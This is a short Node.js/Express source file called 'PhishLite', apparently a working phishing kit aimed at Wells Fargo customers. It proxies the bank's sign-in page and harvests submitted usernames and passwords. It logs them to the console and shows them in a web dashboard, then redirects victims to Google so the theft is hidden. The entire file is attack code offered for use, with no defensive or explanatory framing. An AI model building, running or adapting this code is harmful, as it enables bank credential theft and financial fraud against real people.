const express = require('express');
const bodyParser = require('body-parser');
const httpProxy = require('http-proxy-middleware');
const app = express();
const port = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));

// In-memory credential storage
const credentials = [];

// Proxy configuration for Wells Fargo
app.use('/signin', httpProxy.createProxyMiddleware({
  target: 'https://www.wellsfargo.com',
  changeOrigin: true,
  pathRewrite: { '^/signin': '/signin' },
  onProxyReq: (proxyReq, req, res) => {
    // Capture POST data
    if (req.method === 'POST') {
      const body = req.body;
      if (body.userid && body.password) {
        credentials.push({ username: body.userid, password: body.password });
        console.log(`Captured: ${body.userid}:${body.password}`);
      }
    }
  },
  onProxyRes: (proxyRes, req, res) => {
    // Redirect after successful login
    if (proxyRes.statusCode === 302) {
      res.redirect('https://www.google.com');
    }
  }
}));

// Web UI for credentials
app.get('/', (req, res) => {
  const html = `
    <html>
      <head><title>PhishLite UI</title></head>
      <body>
        <h1>Wells Fargo PhishLite</h1>
        <p>Phishing site: <a href="/signin" target="_blank">Access</a></p>
        <h2>Captured Credentials</h2>
        ${credentials.length ? `
          <table border="1">
            <tr><th>Username</th><th>Password</th></tr>
            ${credentials.map(cred => `<tr><td>${cred.username}</td><td>${cred.password}</td></tr>`).join('')}
          </table>
        ` : '<p>No credentials captured.</p>'}
      </body>
    </html>
  `;
  res.send(html);
});

app.listen(port, () => {
  console.log(`PhishLite running on port ${port}`);
});
